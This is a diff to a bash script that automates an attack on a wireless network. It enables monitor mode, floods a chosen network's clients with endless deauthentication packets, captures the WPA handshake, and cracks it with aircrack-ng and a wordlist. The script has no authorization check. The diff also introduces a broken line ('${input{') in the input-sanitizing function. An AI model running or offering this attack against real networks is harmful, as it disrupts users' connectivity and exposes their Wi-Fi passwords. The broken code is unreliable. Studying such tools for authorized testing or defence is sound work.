@@ -1,29 +1,29 @@
 #!/bin/bash
 
 sanitize_input() {
-    local input="$1"
-    input=$(echo "$input" | xargs)
-    echo "$input"
+    local input="${1}"
+    input=$(echo "${input{" | xargs)
+    echo "${input}"
 }
 
 read -p "Enter the wireless interface name: " interface
-interface=$(sanitize_input "$interface")
+interface=$(sanitize_input "${interface}")
 airmon-ng check kill
-airmon-ng start "$interface"
-airodump-ng "$interface"
-read -p '$\nEnter the BSSID of the target network: ' bssid
+airmon-ng start "${interface}"
+airodump-ng "${interface}"
+read -p "Enter the BSSID of the target network: " bssid
+bssid=$(sanitize_input "${bssid}")
 read -p "Enter the Channel number: " channel
-bssid=$(sanitize_input "$bssid")
-channel=$(sanitize_input "$channel")
-iwconfig "$interface" channel "$channel"
+channel=$(sanitize_input "${channel}")
+iwconfig "${interface}" channel "${channel}"
 timestamp=$(date +"%Y-%m-%d_%H:%M:%S")
 output_dir="pcap_files"
-mkdir -p "$output_dir"
+mkdir -p "${output_dir}"
 output_file="${output_dir}/${bssid}_${timestamp}"
-xterm -e "aireplay-ng -0 0 -a $bssid $interface" & sleep 1 && xterm -e "airodump-ng --bssid $bssid -c $channel -w $output_file $interface"
+xterm -e "aireplay-ng -0 0 -a ${bssid} ${interface}" & sleep 1 && xterm -e "airodump-ng --bssid ${bssid} -c ${channel} -w ${output_file} ${interface}"
 pcap_file="${output_file}-01.cap"
 wait
-read -p '$\nEnter the path to your custom wordlist file: ' custom_wordlist
-custom_wordlist=$(sanitize_input "$custom_wordlist")
-aircrack-ng -w "$custom_wordlist" "$pcap_file"
+read -p "Enter the path to your custom wordlist file: " custom_wordlist
+custom_wordlist=$(sanitize_input "${custom_wordlist}")
+aircrack-ng -w "${custom_wordlist}" "${pcap_file}"
 exit 0
